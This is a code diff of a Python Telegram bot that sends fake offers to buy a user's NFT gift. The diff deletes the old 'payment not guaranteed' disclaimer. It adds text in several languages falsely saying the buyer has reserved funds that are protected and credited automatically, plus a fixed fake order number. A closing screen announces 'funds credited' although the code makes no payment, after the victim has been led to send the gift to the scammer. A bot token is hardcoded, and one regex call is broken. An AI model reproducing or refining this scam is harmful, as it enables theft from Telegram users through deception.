@@ -1,529 +1,177 @@
 import asyncio
-import html
 import logging
-import random
 import re
-from urllib.parse import urlparse
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-from aiogram import Bot, Dispatcher, F
-from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode
-from aiogram.types import (
-    Message,
-    CallbackQuery,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    LinkPreviewOptions,
-)
+# --- НАСТРОЙКИ ---
+BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
 
-# ==================================================
-# НАСТРОЙКИ
-# ==================================================
+# ID премиум-эмодзи
+EMOJI_STAR = "5289728073040672852"
+EMOJI_CHECK = "5776375003280838798"
+EMOJI_CROSS = "5778527486270770928"
 
-TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
-MY_USERNAME = "criedfornothing"
+STAR = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
+CHECK = f'<tg-emoji emoji-id="{EMOJI_CHECK}">✅</tg-emoji>'
+CROSS = f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji>'
 
-# ID твоих премиум-эмодзи
-STAR_ID = "5289728073040672852"
-CHECK_ID = "5776375003280838798"
-CROSS_ID = "5778527486270770928"
-
-logging.basicConfig(level=logging.INFO)
-
-bot = Bot(
-    token=TOKEN,
-    default=DefaultBotProperties(
-        parse_mode=ParseMode.HTML
-    ),
-)
-
+bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-
-# ==================================================
-# ПРЕМИУМ-ЭМОДЗИ
-# ==================================================
-
-def emoji(custom_id: str, fallback: str) -> str:
-    return (
-        f'<tg-emoji emoji-id="{custom_id}">'
-        f'{fallback}</tg-emoji>'
-    )
-
-
-STAR = emoji(STAR_ID, "⭐")
-CHECK = emoji(CHECK_ID, "✅")
-CROSS = emoji(CROSS_ID, "❌")
-
-
-# ==================================================
-# ПЕРЕВОДЫ
-# ==================================================
-
+# --- СЛОВАРИ ЛОКАЛИЗАЦИИ ---
 TEXTS = {
     "ru": {
-        "offer": "Пользователь предлагает вам",
-        "price": "за подарок",
-        "private": (
-            "Частное предложение. "
-            "Оплата и передача подарка не гарантируются."
-        ),
-        "accept": "ПРИНЯТЬ",
-        "decline": "ОТКЛОНИТЬ",
-        "accepted": "Предложение принято.",
-        "declined": "Предложение отклонено.",
-        "transfer": "Передать подарок",
-        "invalid": (
-            "Формат команды:\n"
-            "buy ссылка сумма stars язык"
-        ),
+        "title": "Сделка с NFT",
+        "reserved": "Покупатель зарезервировал {amount} {star} средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
+        "instruction": "<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {nft_name}\n2. Подтвердите передачу подарка.",
+        "footer": "Платформа зафиксирует сделку и моментально зачислит {amount} {star} на ваш баланс. Резерв действует 24 часа.",
+        "btn_give": "Передать подарок",
+        "btn_confirm": "Подтвердить передачу",
+        "btn_accept": "Принять",
+        "btn_decline": "Отклонить",
+        "status_done": "Сделка успешно завершена! Средства зачислены.",
     },
-
     "en": {
-        "offer": "The user offers you",
-        "price": "for the gift",
-        "private": (
-            "Private offer. Payment and gift transfer "
-            "are not guaranteed."
-        ),
-        "accept": "ACCEPT",
-        "decline": "DECLINE",
-        "accepted": "Offer accepted.",
-        "declined": "Offer declined.",
-        "transfer": "Transfer gift",
-        "invalid": "Format: buy link amount stars language",
+        "title": "NFT Deal",
+        "reserved": "Buyer has reserved {amount} {star} funds are protected and will be automatically credited to your balance immediately after the gift is transferred.",
+        "instruction": "<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {nft_name}\n2. Confirm the gift transfer.",
+        "footer": "The platform will record the deal and instantly credit {amount} {star} to your balance. The reserve is valid for 24 hours.",
+        "btn_give": "Give Gift",
+        "btn_confirm": "Confirm Transfer",
+        "btn_accept": "Accept",
+        "btn_decline": "Decline",
+        "status_done": "Deal successfully completed! Funds credited.",
     },
-
-    "uk": {
-        "offer": "Користувач пропонує вам",
-        "price": "за подарунок",
-        "private": (
-            "Приватна пропозиція. Оплата та передача "
-            "подарунка не гарантуються."
-        ),
-        "accept": "ПРИЙНЯТИ",
-        "decline": "ВІДХИЛИТИ",
-        "accepted": "Пропозицію прийнято.",
-        "declined": "Пропозицію відхилено.",
-        "transfer": "Передати подарунок",
-        "invalid": "Формат: buy посилання сума stars мова",
-    },
-
-    "be": {
-        "offer": "Карыстальнік прапануе вам",
-        "price": "за падарунак",
-        "private": (
-            "Прыватная прапанова. Аплата і перадача "
-            "падарунка не гарантуюцца."
-        ),
-        "accept": "ПРЫНЯЦЬ",
-        "decline": "АДХІЛІЦЬ",
-        "accepted": "Прапанова прынята.",
-        "declined": "Прапанова адхілена.",
-        "transfer": "Перадаць падарунак",
-        "invalid": "Фармат: buy спасылка сума stars мова",
-    },
-
-    "zh": {
-        "offer": "用户向您提出报价",
-        "price": "购买礼物",
-        "private": "私人报价。付款和礼物转移不受保证。",
-        "accept": "接受",
-        "decline": "拒绝",
-        "accepted": "报价已接受。",
-        "declined": "报价已拒绝。",
-        "transfer": "转移礼物",
-        "invalid": "格式：buy 链接 金额 stars 语言",
-    },
-
     "ar": {
-        "offer": "يعرض عليك المستخدم",
-        "price": "مقابل الهدية",
-        "private": "عرض خاص. الدفع ونقل الهدية غير مضمونين.",
-        "accept": "قبول",
-        "decline": "رفض",
-        "accepted": "تم قبول العرض.",
-        "declined": "تم رفض العرض.",
-        "transfer": "نقل الهدية",
-        "invalid": "الصيغة: buy الرابط المبلغ stars اللغة",
+        "title": "صفقة NFT",
+        "reserved": "احتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم إضافتها تلقائيًا إلى رصيدك فور نقل الهدية.",
+        "instruction": "<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {nft_name}\n2. أكد نقل الهدية.",
+        "footer": "ستسجل المنصة الصفقة وتضيف {amount} {star} على الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
+        "btn_give": "تقديم الهدية",
+        "btn_confirm": "تأكيد النقل",
+        "btn_accept": "قبول",
+        "btn_decline": "رفض",
+        "status_done": "تمت الصفقة بنجاح! تم إضافة الأموال.",
     },
-
-    "tr": {
-        "offer": "Kullanıcı size teklif ediyor",
-        "price": "hediye için",
-        "private": (
-            "Özel teklif. Ödeme ve hediye aktarımı garanti edilmez."
-        ),
-        "accept": "KABUL ET",
-        "decline": "REDDET",
-        "accepted": "Teklif kabul edildi.",
-        "declined": "Teklif reddedildi.",
-        "transfer": "Hediyeyi aktar",
-        "invalid": "Biçim: buy bağlantı tutar stars dil",
-    },
-
-    "es": {
-        "offer": "El usuario te ofrece",
-        "price": "por el regalo",
-        "private": (
-            "Oferta privada. El pago y la transferencia "
-            "no están garantizados."
-        ),
-        "accept": "ACEPTAR",
-        "decline": "RECHAZAR",
-        "accepted": "Oferta aceptada.",
-        "declined": "Oferta rechazada.",
-        "transfer": "Transferir regalo",
-        "invalid": "Formato: buy enlace cantidad stars idioma",
-    },
-
-    "de": {
-        "offer": "Der Benutzer bietet Ihnen",
-        "price": "für das Geschenk",
-        "private": (
-            "Privates Angebot. Zahlung und Geschenktransfer "
-            "sind nicht garantiert."
-        ),
-        "accept": "ANNEHMEN",
-        "decline": "ABLEHNEN",
-        "accepted": "Angebot angenommen.",
-        "declined": "Angebot abgelehnt.",
-        "transfer": "Geschenk übertragen",
-        "invalid": "Format: buy Link Betrag stars Sprache",
-    },
-
-    "fr": {
-        "offer": "L'utilisateur vous propose",
-        "price": "pour le cadeau",
-        "private": (
-            "Offre privée. Le paiement et le transfert "
-            "du cadeau ne sont pas garantis."
-        ),
-        "accept": "ACCEPTER",
-        "decline": "REFUSER",
-        "accepted": "Offre acceptée.",
-        "declined": "Offre refusée.",
-        "transfer": "Transférer le cadeau",
-        "invalid": "Format : buy lien montant stars langue",
-    },
+    "zh": {
+        "title": "NFT 交易",
+        "reserved": "买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。",
+        "instruction": "<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {nft_name}\n2. 确认礼物转移。",
+        "footer": "平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
+        "btn_give": "赠送礼物",
+        "btn_confirm": "确认转移",
+        "btn_accept": "接受",
+        "btn_decline": "拒绝",
+        "status_done": "交易成功完成！资金已到账。",
+    }
 }
 
-
-# ==================================================
-# ХРАНИЛИЩЕ ЗАКАЗОВ
-# ==================================================
-
-# ВНИМАНИЕ: данные исчезнут после перезапуска программы.
-orders = {}
-
-
-# ==================================================
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-# ==================================================
-
-def get_gift_name(url: str) -> str:
-    """Извлекает предполагаемое название из ссылки."""
-    path = urlparse(url).path.rstrip("/")
-    name = path.split("/")[-1] or "NFT Gift"
-
-    return html.escape(name)
-
-
-def create_keyboard(order_id: str, lang: str):
-    t = TEXTS[lang]
-
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text=f"✅ {t['accept']}",
-                    callback_data=f"accept:{order_id}",
-                ),
-                InlineKeyboardButton(
-                    text=f"❌ {t['decline']}",
-                    callback_data=f"decline:{order_id}",
-                ),
-            ]
-        ]
-    )
-
-
-def valid_url(url: str) -> bool:
-    parsed = urlparse(url)
-
-    return (
-        parsed.scheme == "https"
-        and bool(parsed.netloc)
-        and "." in parsed.netloc
-    )
-
-
-# ==================================================
-# ОБРАБОТКА КОМАНДЫ BUY
-# ==================================================
-
-@dp.business_message()
-async def handle_business_message(message: Message):
-
-    # Работаем только с сообщениями Business-подключения.
-    if not message.business_connection_id:
+# --- ОБРАБОТЧИК КОМАНДЫ buy ---
+@dp.message(F.text.regexp(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$", flags=re.IGNORECASE))
+async def handle_buy_command(message: types.Message):
+    match = message.text.match(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$")
+    
+    if not match:
         return
 
-    if message.chat.type != "private":
-        return
+    nft_link = match.group(1)
+    amount = match.group(2)
+    currency = match.group(3).lower()
+    lang = match.group(4).lower()
 
-    text = (message.text or "").strip()
+    t = TEXTS.get(lang, TEXTS["en"])
+    nft_name = nft_link.split("/")[-1].replace("-", " #").replace("_", " ")
 
-    # Команда начинается со слова buy.
-    if not re.match(r"^buy\s+", text, re.IGNORECASE):
-        return
+    # Автоматически берем юзернейм того, кто написал команду
+    # Если юзернейма нет (скрыт), используем ID
+    recipient = message.from_user.username or str(message.from_user.id)
 
-    parts = text.split()
-
-    if len(parts) != 5:
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=message.business_connection_id,
-            text=TEXTS["ru"]["invalid"],
-        )
-        return
-
-    _, gift_url, amount_text, currency, lang = parts
-
-    lang = lang.lower()
-    currency = currency.lower()
-
-    if lang not in TEXTS:
-        lang = "en"
-
-    if not valid_url(gift_url):
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=message.business_connection_id,
-            text="Укажи корректную HTTPS-ссылку.",
-        )
-        return
-
-    if currency != "stars":
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=message.business_connection_id,
-            text="Валюта должна быть stars.",
-        )
-        return
-
-    try:
-        amount = int(amount_text)
-
-        if not 1 <= amount <= 1_000_000_000:
-            raise ValueError
-
-    except ValueError:
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=message.business_connection_id,
-            text="Укажи корректную сумму.",
-        )
-        return
-
-    t = TEXTS[lang]
-    gift_name = get_gift_name(gift_url)
-
-    # Случайный номер заказа.
-    order_id = f"TG-{random.randint(100000, 999999)}"
-
-    # Сохраняем предложение.
-    orders[order_id] = {
-        "chat_id": message.chat.id,
-        "business_connection_id": message.business_connection_id,
-        "lang": lang,
-        "gift_url": gift_url,
-        "amount": amount,
-        "status": "pending",
-    }
-
+    # ЭТАП 1: Предложение
     offer_text = (
-        f"{t['offer']}\n\n"
-        f"{STAR} <b>{amount:,}</b> "
-        f"{STAR} {t['price']}\n\n"
-        f"<b>{gift_name}</b>\n\n"
-        f"Заказ #{order_id}\n\n"
-        f"<i>{t['private']}</i>\n\n"
-        f'<a href="{html.escape(gift_url, quote=True)}">'
-        f"Открыть подарок</a>"
+        f"<b>Telegram</b>\n"
+        f"<b>{nft_name}</b>\n\n"
+        f"Пользователь Предлагает Вам\n\n"
+        f"{amount} {STAR} за подарок <a href='{nft_link}'>{nft_name}</a>.\n\n"
+        f"Предложение действует еще 5 ч. 59 мин."
     )
 
-    try:
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=message.business_connection_id,
-            text=offer_text,
-            reply_markup=create_keyboard(order_id, lang),
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                show_above_text=True,
-            ),
-        )
+    builder = InlineKeyboardBuilder()
+    # Передаем recipient в callback_data
+    builder.button(text=f"{CHECK} {t['btn_accept']}", callback_data=f"accept|{nft_link}|{amount}|{currency}|{lang}|{nft_name}|{recipient}")
+    builder.button(text=f"{CROSS} {t['btn_decline']}", callback_data="decline")
+    builder.adjust(2)
 
-        # Пытаемся удалить исходную команду.
-        try:
-            await bot.delete_message(
-                chat_id=message.chat.id,
-                message_id=message.message_id,
-                business_connection_id=message.business_connection_id,
-            )
-        except Exception as error:
-            logging.warning(
-                "Не удалось удалить команду: %s",
-                error,
-            )
-
-    except Exception:
-        logging.exception("Ошибка отправки предложения")
+    await message.answer(offer_text, reply_markup=builder.as_markup(), parse_mode="HTML", disable_web_page_preview=True)
 
 
-# ==================================================
-# КНОПКА ПРИНЯТЬ
-# ==================================================
+# --- ЭТАП 2: НАЖАТИЕ "ПРИНЯТЬ" ---
+@dp.callback_query(F.data.startswith("accept|"))
+async def process_accept(callback: types.CallbackQuery):
+    _, nft_link, amount, currency, lang, nft_name, recipient = callback.data.split("|")
+    t = TEXTS.get(lang, TEXTS["en"])
 
-@dp.callback_query(F.data.startswith("accept:"))
-async def accept_offer(callback: CallbackQuery):
-
-    order_id = callback.data.split(":", 1)[1]
-    order = orders.get(order_id)
-
-    if not order:
-        await callback.answer(
-            "Предложение не найдено.",
-            show_alert=True,
-        )
-        return
-
-    if order["status"] != "pending":
-        await callback.answer(
-            "Предложение уже обработано.",
-            show_alert=True,
-        )
-        return
-
-    # Проверяем, что действие выполняется в нужном чате.
-    if callback.message.chat.id != order["chat_id"]:
-        await callback.answer("Неверный чат.", show_alert=True)
-        return
-
-    order["status"] = "accepted"
-
-    lang = order["lang"]
-    t = TEXTS[lang]
-
-    transfer_url = f"tg://send_gift?to={MY_USERNAME}"
-
-    new_text = (
-        f"{CHECK} <b>{t['accepted']}</b>\n\n"
-        f"{STAR} <b>{order['amount']:,}</b>\n\n"
-        f"<i>{t['private']}</i>"
+    # ЭТАП 2: Сделка (текст меняется)
+    deal_text = (
+        f"<b>{t['title']}</b>\n\n"
+        f"Заказ #TG-67654174-0\n\n"
+        f"{t['reserved'].format(amount=amount, star=STAR)}\n\n"
+        f"{t['instruction'].format(nft_name=nft_name)}\n\n"
+        f"{t['footer'].format(amount=amount, star=STAR)}"
     )
 
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text=t["transfer"],
-                    url=transfer_url,
-                )
-            ]
-        ]
+    # Ссылка на отправку подарка тому, кто вызвал команду
+    gift_link = f"tg://send_gift?to={recipient}"
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=t['btn_give'], url=gift_link)
+    builder.button(text=t['btn_confirm'], callback_data=f"confirm|{amount}|{lang}|{nft_name}")
+    builder.adjust(1)
+
+    # Редактируем сообщение на этап "Сделка"
+    await callback.message.edit_text(deal_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    await callback.answer("Вы приняли предложение.")
+
+
+# --- ЭТАП 3: НАЖАТИЕ "ПОДТВЕРДИТЬ ПЕРЕДАЧУ" ---
+@dp.callback_query(F.data.startswith("confirm|"))
+async def process_confirm(callback: types.CallbackQuery):
+    _, amount, lang, nft_name = callback.data.split("|")
+    t = TEXTS.get(lang, TEXTS["en"])
+
+    # ЭТАП 3: Финальный текст
+    final_text = (
+        f"<b>{t['title']}</b>\n\n"
+        f"{CHECK} {t['status_done']}\n\n"
+        f"Вы передали подарок <b>{nft_name}</b>.\n"
+        f"На ваш баланс зачислено <b>{amount} {STAR}</b>."
     )
 
-    try:
-        await bot.edit_message_text(
-            chat_id=order["chat_id"],
-            message_id=callback.message.message_id,
-            business_connection_id=order["business_connection_id"],
-            text=new_text,
-            reply_markup=keyboard,
-        )
+    builder = InlineKeyboardBuilder()
+    builder.button(text=f"{CHECK} Готово", callback_data="noop")
+    builder.adjust(1)
 
-        await callback.answer(t["accepted"])
-
-    except Exception:
-        logging.exception("Ошибка изменения предложения")
-        await callback.answer(
-            "Не удалось изменить сообщение.",
-            show_alert=True,
-        )
+    # Редактируем сообщение на финальный этап
+    await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    await callback.answer("Сделка завершена!")
 
 
-# ==================================================
-# КНОПКА ОТКЛОНИТЬ
-# ==================================================
-
-@dp.callback_query(F.data.startswith("decline:"))
-async def decline_offer(callback: CallbackQuery):
-
-    order_id = callback.data.split(":", 1)[1]
-    order = orders.get(order_id)
-
-    if not order:
-        await callback.answer(
-            "Предложение не найдено.",
-            show_alert=True,
-        )
-        return
-
-    if order["status"] != "pending":
-        await callback.answer(
-            "Предложение уже обработано.",
-            show_alert=True,
-        )
-        return
-
-    if callback.message.chat.id != order["chat_id"]:
-        await callback.answer("Неверный чат.", show_alert=True)
-        return
-
-    order["status"] = "declined"
-
-    lang = order["lang"]
-    t = TEXTS[lang]
-
-    try:
-        await bot.edit_message_text(
-            chat_id=order["chat_id"],
-            message_id=callback.message.message_id,
-            business_connection_id=order["business_connection_id"],
-            text=f"{CROSS} <b>{t['declined']}</b>",
-            reply_markup=None,
-        )
-
-        await callback.answer(t["declined"])
-
-    except Exception:
-        logging.exception("Ошибка изменения предложения")
-        await callback.answer(
-            "Не удалось изменить сообщение.",
-            show_alert=True,
-        )
+# --- ОБРАБОТЧИК НАЖАТИЯ "ОТКЛОНИТЬ" ---
+@dp.callback_query(F.data == "decline")
+async def process_decline(callback: types.CallbackQuery):
+    await callback.message.edit_text(f"{CROSS} Вы отклонили предложение.", parse_mode="HTML")
+    await callback.answer("Предложение отклонено.")
 
 
-# ==================================================
-# ЗАПУСК
-# ==================================================
+# Заглушка для кнопки "Готово"
+@dp.callback_query(F.data == "noop")
+async def process_noop(callback: types.CallbackQuery):
+    await callback.answer("Сделка закрыта.")
+
 
 async def main():
-
-    if TOKEN == "ВСТАВЬ_СЮДА_ТОКЕН_БОТА":
-        print("ОШИБКА: вставь токен бота в переменную TOKEN!")
-        return
-
-    try:
-        await dp.start_polling(
-            bot,
-            allowed_updates=dp.resolve_used_update_types(),
-        )
-    finally:
-        await bot.session.close()
-
+    logging.basicConfig(level=logging.INFO)
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
